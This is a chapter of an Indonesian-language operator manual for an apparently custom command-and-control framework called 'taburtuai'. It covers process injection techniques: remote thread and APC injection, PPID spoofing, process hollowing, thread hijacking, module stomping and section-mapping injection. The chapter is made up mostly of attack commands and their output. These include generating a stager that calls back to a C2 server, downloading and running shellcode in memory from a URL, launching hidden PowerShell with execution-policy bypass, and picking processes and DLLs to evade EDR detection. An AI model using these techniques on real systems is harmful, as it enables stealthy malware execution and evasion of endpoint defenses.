# 10 — Process Injection

## Konsep

Process injection adalah teknik memasukkan shellcode atau kode berbahaya ke dalam proses
lain yang sedang berjalan. Tujuannya:

- **Stealth**: shellcode jalan dalam konteks proses legitimate (explorer.exe, svchost.exe)
- **Privilege escalation**: kalau target proses punya privilege lebih tinggi
- **Defense evasion**: EDR melihat aktivitas dari proses yang trusted, bukan dari agent kita

**Semua teknik injection butuh shellcode (`.bin`), bukan EXE.**

---

## Persiapan: Buat Shellcode

```bash
# Opsi 1: Generate shellcode dari stager
go run ./cmd/generate stager \
  --server http://172.23.0.118:8000 \
  --token TOKEN \
  --key KEY \
  --format shellcode \
  --output payload.bin

# Opsi 2: Konversi EXE ke shellcode dengan donut
donut -i bin/agent_windows_stealth.exe -o payload.bin -a 2 -e 3
```

---

## Inject Remote — CRT / APC ke Proses Lain

### Classic Remote Thread Injection (CRT)

Cara kerja:
1. Buka handle ke proses target (`OpenProcess`)
2. Alokasi memori di proses target (`VirtualAllocEx`)
3. Tulis shellcode ke memori target (`WriteProcessMemory`)
4. Buat thread baru untuk eksekusi (`CreateRemoteThread`)

```
taburtuai(IP:PORT) › inject remote 2703886d --pid 3048 --file payload.bin --wait
```

```
[+] Injecting payload.bin (45,056 bytes) into PID 3048 (explorer.exe)...
[+] Injection completed. Thread created in target process.
```

### APC Injection (Lebih Stealth)

Cara kerja: alih-alih membuat thread baru, shellcode di-queue sebagai **Asynchronous
Procedure Call** ke thread yang sudah ada di proses target. Thread mengeksekusi APC
saat masuk ke alertable wait state.

```
taburtuai(IP:PORT) › inject remote 2703886d --pid 3048 --file payload.bin --method apc --wait
```

**Mengapa APC lebih stealth:**
- Tidak membuat thread baru (tidak ada "thread creation" event)
- Shellcode jalan dalam konteks thread yang sudah ada
- Lebih sulit dideteksi oleh EDR yang monitor `CreateRemoteThread`

### Pilih Target Proses untuk Injection

```
# Lihat proses yang berjalan dulu
process list 2703886d

# Proses yang direkomendasikan sebagai target injection:
# explorer.exe    → selalu ada, user context, stabil
# RuntimeBroker.exe → trusted Microsoft process
# spoolsv.exe     → SYSTEM context (kalau butuh elevated)
# svchost.exe     → banyak instance, susah dianalisis
```

---

## Inject Self — Shellcode di Agent Process

Eksekusi shellcode dalam proses agent sendiri. Tidak ada injection ke proses lain.

```
taburtuai(IP:PORT) › inject self 2703886d --file payload.bin --wait
```

```
[+] Executing payload.bin (45,056 bytes) in-process...
[+] Shellcode executed.
```

**Kapan dipakai:**
- Testing shellcode sebelum inject ke proses lain
- Situasi di mana tidak ada proses yang cocok untuk di-inject
- Shellcode yang butuh context yang sama dengan agent

---

## PPID Spoofing — Spawn Proses dengan Parent Palsu

Buat proses baru dengan **parent process yang berbeda** dari yang sebenarnya. Berguna
untuk membuat chain proses terlihat lebih legitimate.

### Contoh Tanpa PPID Spoofing

```
agent.exe (PID 4512)
  └─► cmd.exe (PID 6720)    ← mencurigakan: cmd lahir dari agent
```

### Contoh Dengan PPID Spoofing

```
explorer.exe (PID 3048)
  └─► cmd.exe (PID 6720)    ← terlihat normal: cmd lahir dari explorer
```

### Syntax

```
inject ppid <id> <exe-path> [--ppid-name <name>] [--ppid <pid>] [--args <args>]
```

### Contoh

```
# Spawn cmd.exe dengan parent explorer.exe
inject ppid 2703886d "C:\Windows\System32\cmd.exe" --ppid-name explorer.exe --wait

# Spawn PowerShell dengan parent svchost.exe (lebih stealth)
inject ppid 2703886d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
  --ppid-name svchost.exe \
  --args "-w hidden -ep bypass -f C:\Temp\script.ps1" \
  --wait

# Spawn menggunakan PID langsung (kalau tahu PID explorer)
inject ppid 2703886d "C:\Windows\System32\calc.exe" --ppid 3048 --wait
```

---

## Process Hollowing — Teknik Lanjutan

Hollow: buat proses legitimate dalam keadaan suspended, hapus kode aslinya di memori,
ganti dengan shellcode kita, resume proses. Proses terlihat seperti legitimate karena
nama dan path-nya asli.

```
taburtuai(IP:PORT) › hollow 2703886d --file payload.bin --wait
```

```
[+] Spawning C:\Windows\System32\svchost.exe (suspended)...
[+] Unmapping original code...
[+] Writing shellcode...
[+] Adjusting entry point...
[+] Resuming process...
[+] Hollow completed. Agent running in svchost.exe (PID: 7832)
```

### Dengan Target Exe Khusus

```
# Hollow ke notepad.exe
hollow 2703886d --file payload.bin --exe notepad.exe --wait

# Hollow ke RuntimeBroker.exe
hollow 2703886d --file payload.bin --exe RuntimeBroker.exe --wait
```

---

## Thread Hijacking

Suspend thread yang berjalan di proses target, ubah RIP (instruction pointer) ke
shellcode kita, resume. Sangat stealth — tidak ada thread baru yang dibuat.

```
taburtuai(IP:PORT) › hijack 2703886d --pid 3048 --file payload.bin --wait
```

```
[+] Targeting thread in PID 3048 (explorer.exe)...
[+] Thread suspended, RIP redirected to shellcode...
[+] Thread resumed.
```

---

## Module Stomping

Timpa kode legitimate sebuah DLL yang sudah di-load di proses target dengan shellcode.
DLL terlihat ter-load dengan normal karena masih ada di process memory map,
tapi isinya sudah diganti.

```
# Stomp ke section .text dari DLL yang jarang dipakai
taburtuai(IP:PORT) › stomp 2703886d --file payload.bin --dll xpsservices.dll --wait
```

```
[+] Locating xpsservices.dll in agent memory...
[+] Overwriting .text section with shellcode...
[+] Executing shellcode from module memory...
[+] Module stomping completed.
```

**DLL yang baik untuk di-stomp:**
- `xpsservices.dll` — XPS document services, jarang dipakai
- `clbcatq.dll` — COM+ catalog, biasanya tidak aktif
- `wbem\wmiutils.dll` — WMI utilities

---

## Section Mapping Injection

Inject shellcode menggunakan Windows Section objects (shared memory). Tidak menggunakan
`WriteProcessMemory` sama sekali — susah dideteksi oleh EDR yang hook API ini.

```
# Inject ke proses agent sendiri (local)
taburtuai(IP:PORT) › mapinject 2703886d --file payload.bin --wait

# Inject ke proses lain via section mapping
taburtuai(IP:PORT) › mapinject 2703886d --file payload.bin --pid 3048 --wait
```

---

## Perbandingan Teknik

| Teknik | API Utama | Thread Baru | WriteProcessMemory | Stealth |
|---|---|---|---|---|
| CRT (Classic) | CreateRemoteThread | Ya | Ya | Rendah |
| APC | QueueUserAPC | Tidak | Ya | Sedang |
| Thread Hijacking | SuspendThread + SetContext | Tidak | Ya | Tinggi |
| Process Hollowing | NtUnmapViewOfSection | Tidak | Ya | Tinggi |
| Module Stomping | VirtualProtect | Tidak | Tidak | Tinggi |
| Section Mapping | NtCreateSection | Tidak | Tidak | Sangat Tinggi |

---

## Staged Delivery ke Proses (In-Memory)

Alternatif injection: download shellcode dari URL secara langsung ke memori proses.

```
# Download shellcode dari URL dan eksekusi in-memory
staged 2703886d http://172.23.0.118:8888/payload.bin --wait

# Download dan inject ke proses lain
staged 2703886d http://172.23.0.118:8888/payload.bin --method crt --pid 3048 --wait
```

---

**Selanjutnya:** [11 — Evasion](11-evasion.md)
